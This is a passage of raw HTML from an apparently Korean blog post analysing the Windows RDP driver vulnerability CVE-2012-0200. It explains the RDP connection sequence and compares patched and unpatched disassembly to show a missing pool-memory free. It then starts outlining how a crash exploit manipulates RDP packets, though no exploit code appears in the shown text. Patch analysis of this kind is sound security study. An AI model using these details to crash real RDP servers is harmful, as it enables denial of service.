url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACgElEQVQozzWSz2sTURDHJ0lTk23UVBCqtSXppvvmvbebdJPdfZtsk9rSX0na1Jg2iUYjCmkvWnsQFEGpt15KAwqC6KW3gl4qIiiI0Jugt17Eizf/BMXDyrY48IWZy2eG73wBmYBEXAOvjMlKkKr2LOU2RSZyyEQembiGXBSRHWkKmSWQi2nKRYZykU/p+d7hWBIoF0CoCYDMiiAaJzzgM9c9AscGEgFkVh9SK4jMChBq+pFZoCbHfcisEFLzFOWiDyDgcwrzcG4QA5QLCakpAWWWRLmIMi2bJ2g4lIsJlswlRmLcj9ySPBCiBZTagN4V3AozTQRzU/Og6c6klsrdS6YcWc9MeMeF4ObL16A7c7X1/QP30befv+8fHLq1x9t7ruvC1JXbYUXOAK1PgEJM8PrRWDrcancCO6+eQ7naeFderLul8sraXLEG2dxsCB5++QHmdLX95PCXu7zZ/eMBV3fffvCA0+vrUeW87kcucsiFNSIxn1rIn25srPa8//oJllZaby5dbrmLlWZnsdL0gGHPMl96oiyWN3c+xIfw78Xm6vfqg607ANCTaZUKynB6mGqCUs1GZSg9pDdmCqXtW9Lu5z2o/gcuNTsLlcYxkI85ET1fhMH+C3epartyTP0IAJK3iaTMk4kbWZBlHQbPIsQ3HKCZbKRxtd3zovsUKgv1/fJC3S2Wl9fmSzWwszMhz8g+LzZqulBGZnVYMnddHy/217e6QIgZJsQEOaGDLI95MyiKEUYq/LqYBKbZba5lu0y100y1AanV6+Un4mWIa7leyu04Ve0ooQYQZgYIMyXCTDj6NLOAHEtSqOFXk45fIcZAfGTsjIJGdJQYoKAZ/AcMa6VJGA6S9wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image27\"\n        title=\"image27\"\n        src=\"/static/66e9b456a76afcbf61f37d5e997817e2/d8f62/image27.png\"\n        srcset=\"/static/66e9b456a76afcbf61f37d5e997817e2/e9ff0/image27.png 180w,\n/static/66e9b456a76afcbf61f37d5e997817e2/f21e7/image27.png 360w,\n/static/66e9b456a76afcbf61f37d5e997817e2/d8f62/image27.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>4. RDP 프로토콜 연결 과정</strong></p>\n<p>RDP 프로토콜의 표준 연결 순서는 클라이언트와 서버의 설정 정보를 상호\n교환하면서 입력된다. 그래픽 정보, 데이터 등을 상호 교환을 하면서\n클라이언트와 서버 간에 연결을 진행</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"> <span class=\"token number\">1.</span>  클라이언트 서버가 네트워크 소켓 계층 초기 연결을 한 다음 RDP를   \n     설정                                                             \n                                                                      \n <span class=\"token number\">2.</span>  프로토콜의 기본 연결이 확인된 후에만 통신을 시작한다<span class=\"token punctuation\">.</span>            \n                                                                      \n <span class=\"token number\">3.</span>  클라이언트와 서버의 시스템 환경과 RDP 연결 환경 간의 정보 교환   \n     및 연결 확인 작업을 수행 <span class=\"token punctuation\">(</span>Connect Initial PDU<span class=\"token punctuation\">)</span>                   \n                                                                      \n <span class=\"token number\">4.</span>  RDP 프로토콜에서 이미지 정보<span class=\"token punctuation\">,</span> 사운드 정보<span class=\"token punctuation\">,</span> 장치 정보 및 클립     \n     보드 컨텐츠는 모두 단일 가상 채널에 존재한다<span class=\"token punctuation\">.</span>                    \n                                                                      \n <span class=\"token number\">5.</span>  전송용 가상 채널의 초기화 정보는 Connect Initial PDU 과정에서    \n     완료된다<span class=\"token punctuation\">.</span>                                                        </code></pre></div>\n<p>※ Protocol Data Unit (PDU): 데이터 통신에서 상위 계층이 전달한 데이터에\n붙이는 제어정보 e.g. ‘네트워크 계층 (packet), 전송 계층 (segment)’</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 540px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 147.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,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'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image28\"\n        title=\"image28\"\n        src=\"/static/5c901388207e2deb0a198ac931f6bf3d/07484/image28.png\"\n        srcset=\"/static/5c901388207e2deb0a198ac931f6bf3d/e9ff0/image28.png 180w,\n/static/5c901388207e2deb0a198ac931f6bf3d/f21e7/image28.png 360w,\n/static/5c901388207e2deb0a198ac931f6bf3d/07484/image28.png 540w\"\n        sizes=\"(max-width: 540px) 100vw, 540px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 546px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 112.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAXCAIAAACEf/j0AAAACXBIWXMAAA7DAAAOwwHHb6hkAAADlklEQVQ4yz2U25KcNhCGebNd73rtqqwTxzd5gDh3qTypc+HxMsMIcRyEBEJCEpI4LQypQfF+F6ASdHX3/7fkPb7/7fHp8/OnP77+9c/Txy/vP/z+sO/cvXu+f/j08P63d4+/Pj59/vPr3x8+frl/eL5793x3/8vd/fPj02eP0qbrtJRStFJK1XW6qmrOWwijb9/+PRx+nM/g5cU/HH4cDj+Ox1OSJFEUhSGsa+rN83y9XhFCl8uFELJt2ziOy7LM81SWJSGEMZamadM0GGPO+TAM1pjXed62zbPWEkLSNM3zHABAKXXBZVkWRYEQiuO4KApKKdopiiKKojRNu667BV+v1+0n67oaY6Zp6vvelZOmaVmWboEQck9jTN/3nnvleY4xLstyHEellNYaIQQA8H3/dDpBCMMwjKIoSRIAAIQwyzIppccYy7IMAHA6nc7nc5Ik1tp1XZVSGOO2bZVSfd9ba9u27brOGCOl7Pv+1jNjrOs6a63W2n1gjGmtCSEvLy8IISFEvcMYc4umaSil1tqb2sMwOKkJIcuyDMMwTZMQIsuyKIoopVrrbkfuaK2VUtfr1RvHESEUBEGSJOfzua7reZ6XZem6ju4ghJRSQoimaVwCrbUQ4vX11dNaTzvzPLuFa5JzHoahS+60SNMUQuj7PqWUc/6/VUopAIAzo+97J0HTNBDCOI7hT4IgyPMcQogxrutaCOG5Jt1/cRxfr9dpmpZl0VpjjJ02hBCMcZZll8uFMSal7LpOKXUrmzEGAHDlOW2MMZzzfYbDOI4PhwOE8Hg8AgDSNOWcO81vwa6xdAchZK0dx7Ft2yRJ3iqqqspVW5YlpbSua0qpl2VZnudO6iRJgiDAGA/D0HWdEykIAsaYtfbNqqZppJTzPHtuVtzuOI7bthljhmGQUuZ5frlcop0sy9zZopQ2TSOEWJbFm6Zp27aiKI7HY1VV27YNw7AsixDCBRNCEEJVVTVN4xRhjK3rehvPYRi2bbPWvk2sMWYcRyllHMd5nrvM5U4cx2+trevqcc7bto2iyNkohGjb1vmcZVkYhqfTKQgC3/ejKAIAuCN9uVxuVhFCwjD0fR9CeD6f4zhmjPV9Tyl1VgEAgiD4/v27O3acc5dgHMebYPM8O2EwxsuyGGPmeW7bNgzDsizNjthxPQshOOe3soUQRVE4hwEARVEYY9Z1raoqCII4jimljDGMcVVVnHNCiFLKXTv/AXbCxQJzNsdVAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 5 4 3\"\n        title=\"image 5 4 3\"\n        src=\"/static/d7d5b443a7cd532887c9fd85a81e4d34/76aed/image-5.4.3.png\"\n        srcset=\"/static/d7d5b443a7cd532887c9fd85a81e4d34/e9ff0/image-5.4.3.png 180w,\n/static/d7d5b443a7cd532887c9fd85a81e4d34/f21e7/image-5.4.3.png 360w,\n/static/d7d5b443a7cd532887c9fd85a81e4d34/76aed/image-5.4.3.png 546w\"\n        sizes=\"(max-width: 546px) 100vw, 546px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>※ X.224: X.224 연결 요청 PDU는 RDP 연결 시퀀스의 연결 시작 단계 동안\n클라이언트에서 서버로 전송되는 RDP 연결 시퀀스 PDU이다.</p>\n<h2 id=\"rdp-드라이버-패치-전-후-코드-비교\" style=\"position:relative;\"><a href=\"#rdp-%EB%93%9C%EB%9D%BC%EC%9D%B4%EB%B2%84-%ED%8C%A8%EC%B9%98-%EC%A0%84-%ED%9B%84-%EC%BD%94%EB%93%9C-%EB%B9%84%EA%B5%90\" aria-label=\"rdp 드라이버 패치 전 후 코드 비교 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RDP 드라이버 패치 전 후 코드 비교</h2>\n<p><strong>1. CVE-2012-0200 취약점 패치 전 RDP 드라이버 (v6.1.7600.16385) 버그\n발생 부분</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token function\">HandleAttachUserReq</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 함수에서 코드 수정이 이루어졌다<span class=\"token punctuation\">.</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">900</span>         lea     eax<span class=\"token punctuation\">,</span> \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">903</span>         push    eax\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">904</span>         push    \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">907</span>         add     esi<span class=\"token punctuation\">,</span> <span class=\"token number\">74</span>h\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">90</span>A         push    esi\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">90</span>B         call    SListRemove\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">910</span> quit<span class=\"token operator\">:</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">910</span>         mov     al<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span></code></pre></div>\n<p><strong>2. CVE-2012-0200 취약성 업데이트된 RDP 드라이버 (v6.1.7600.16963)\n부분</strong></p>\n<p>업데이트 후 코드 블록을 살펴보면 취약점이 존재했던 버전에서\nWDLIBRT_MemFree() 함수를 호출하는 것을 잊어버렸다는 사실을 알 수있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">913</span>         lea     eax<span class=\"token punctuation\">,</span> \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">916</span>         push    eax\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">917</span>         push    \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">91</span>A         add     esi<span class=\"token punctuation\">,</span> <span class=\"token number\">74</span>h\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">91</span>D         push    esi\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">91</span>E         call    SListRemove\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">91</span>E                                       <span class=\"token punctuation\">;</span> 추가된 코드 블록 부분\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">923</span>         mov     eax<span class=\"token punctuation\">,</span> \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>          <span class=\"token punctuation\">;</span> EAX 포인터 복원 부분\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">926</span>         cmp     eax<span class=\"token punctuation\">,</span> ebx              <span class=\"token punctuation\">;</span> <span class=\"token constant\">NULL</span> 값과 비교\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">928</span>         jz      <span class=\"token keyword\">short</span> quit            <span class=\"token punctuation\">;</span> 만약 <span class=\"token constant\">NULL</span> 값이면 QUIT\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">92</span>A         cmp     \\<span class=\"token punctuation\">[</span>eax<span class=\"token operator\">+</span><span class=\"token number\">5</span>\\<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> bl\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">92</span>D         jnz     <span class=\"token keyword\">short</span> quit\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">92F</span>         push    eax                   <span class=\"token punctuation\">;</span> Pool Memory 해제\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">930</span>         call    WDLIBRT_MemFree\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">935</span> quit<span class=\"token operator\">:</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">935</span>         mov     al<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n\n<span class=\"token operator\">*</span><span class=\"token operator\">*</span>\\\n<span class=\"token operator\">*</span><span class=\"token operator\">*</span></code></pre></div>\n<p><strong>3. Pool Memory 블록을 할당한 후 해제하는 함수 ExFreePollWithTag()</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0 WDLIBRT_MemFree proc near   <span class=\"token punctuation\">;</span> <span class=\"token function\">ExFreePoolWithTag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>함수의 wrapper\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0 P               <span class=\"token operator\">=</span> dword ptr  <span class=\"token number\">8</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0         mov     edi<span class=\"token punctuation\">,</span> edi\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA2         push    ebp\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA3         mov     ebp<span class=\"token punctuation\">,</span> esp\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA5         push    <span class=\"token number\">0</span>           <span class=\"token punctuation\">;</span> Tag값은 <span class=\"token constant\">NULL</span> 인 상태\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA7         push    \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>     <span class=\"token punctuation\">;</span> P \\<span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> pool pointe<span class=\"token punctuation\">,</span> 인수로 전달한다<span class=\"token punctuation\">.</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BAA         call    ds<span class=\"token operator\">:</span>ExFreePoolWithTag\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BB0         pop     ebp\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BB1         retn    <span class=\"token number\">4</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BB1 WDLIBRT_MemFree endp</code></pre></div>\n<p>※ wrapper 함수: 기존에 함수를 한 번 감싸고 원래 동작에 기능 처리를 추가하는 함수</p>\n<p>※ Memory pool: C의 malloc, C++의 new 연산자와 유사한 메모리 동적할당을 가능하게 해준다.</p>\n<p>다른\n점은 malloc, new 연산자 같은 기능들은 다양한 블록사이즈 때문에 단편화를 유발시키고</p>\n<p>조각\n화된 메모리들을 퍼포먼스 때문에 실시간 시스템에서 사용할 수 없는 문제로 인해 Memory Pool을</p>\n<p>사용한다. 효율적인 방법으로 동일한 사이즈의 메모리 블록들을 미리 할당해 놓고 특정 트리거에 의해</p>\n<p>애플리케이션 이 필요할 때 마다. 메모리 블록들을 할당하고, 접근하고 해제할 수 있다</p>\n<p>RDP 드라이버 패치 전 버그 부분에서 Pool Memory 해제를 하지 않았다는\n사실을 알 수 있다. 해당 버그를 통해서 발생한 취약점이 루이지 아우라엠\n(Luigi Auriemma)이 보고한 CVE-2012-0200 취약점이다. 루이지 아우리엠은\nTCP/3389에서 RDP 서비스를 실행하는 취약한 서버를 충돌시키는 패킷을\n발표하였다.</p>\n<h2 id=\"공격-코드\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C\" aria-label=\"공격 코드 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 코드</h2>\n<h3 id=\"공격-코드-분석\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"공격 코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 코드 분석</h3>\n<p>공격코드는 크게 선언, 대상 서버로 전송되는 RDP 패킷 변조 페이로드 구성,\n대상 서버로 전송, BSOD 발생여부로 나눌 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 333px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 78.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADhUlEQVQ4y11UO48bVRS+SEhUEBAIkWQde573Ne/HnbHHj3W82eyuvd51kvU+sjjJ7ogFBQpEQQEFQkgIyUBjKJBo6JGQiCl4/AVaBAUNEilCqCiQyPiie2NHqxRH35lzvnvunDPfHECs9CNipT8ZMCwhwt5GhHGI4wIRVkAczxBhM9dvzBwvmzlefe7XZyI3zxdzPkeEvQv8sMVZ2uG6GXyJCPsN4lgUfDAvLEj84PAVvrN7xPOTN/no5m1+49brnFjpozzC8YO5/wdAhH2DCLsLMWOIsM9kIcJm8xvlIUwTaaLIAk9feIr/BTBgCBTNFYUBFkaTkFhpHdOkRu1qhmmaPX1mKXvu+Ur20jko7ZlnSxmmSUasVGAN06SBaRJgygDQzWCoGf57XtB6ChF2ZKLoR80I7hgwnKq6NxU4uDqabg0Op+1Of9pq96ZXrt2Ymiia6mYg0YDhHXEOETYCQbTMm8tdMcOvII7/pHaVR6zNXb8hZxvGbX44epXv7ue819+XsxTPtptxL2hywXe8ukSI43+B6zd+FR/GRPFtVfd/zhrrfO8g593NPX7z+A0+uDrim1sHvLM64FuDQ+lv9IYyPtw75u1On693h5ylK1wzgl/ACy9qZ86XsKIZPkA0WTJRdKxobm6iKFd1L9fNIMc0yYmVSoM4zi2nmiPCJEegDkPhH2GangUmijxF8zYV1QUQsyYi7HNMk4miuRNF9yZlxZmUytakrNjSKqozWbpAJxXVlb7gCf5cITXgBc1/sua6mOHHiLDfxec3YCRbXNvYkXO7Nrw1b3WXdy5ty3ZFToyl0drgBgznMmJ/Acer/x0nF0XwQyFskTBRxJvtHm+0ury53OP97ev84sq2vKTeXOcrqwOZu3T5yuMF7wrZuIrmblYUW7Rch5h9iggbV1R3XFGdcVmxx6ULVKIwRXPHpTJ9lFNUdyz4EMefIMJS0O70AQDgCSFwiJnQYiIS1K4m1K6mtpulmuGnZ8/DtKI6EnUzkHHLqUme4CPCGKLJk8Byaj8E0fJ9A4ZdRNh3i19uYaJ9IaussSb1Wa1f5n7YlPHHuYiw76WwhZZ0M/gWEXZvvhz+ExsEU1Zohl+srA6K6y+fFL3+fnHy2lvF2sZOoepegWkiN83DZSLPcfEvv6ObwdfUrp5DhH1wan0t1tPMgOFM1b2ZbgbSX8QXiB6ieMP3/wd1oKU6sv+hzQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image31\"\n        title=\"image31\"\n        src=\"/static/d496ae5b627a46e7a7ee27970d136a42/24c7e/image31.png\"\n        srcset=\"/static/d496ae5b627a46e7a7ee27970d136a42/e9ff0/image31.png 180w,\n/static/d496ae5b627a46e7a7ee27970d136a42/24c7e/image31.png 333w\"\n        sizes=\"(max-width: 333px) 100vw, 333px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>1. 공격 코드 RDP 패킷 변조</strong></p>\n<p>RDP 연결과정에서 발생되는 패킷의 변조를 통해 페이로드가 작성된다. 크게\nClient MCS Attach User Request PDU, maxChannelids filed, RDP connection\nrequest 부분으로 나눠진다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    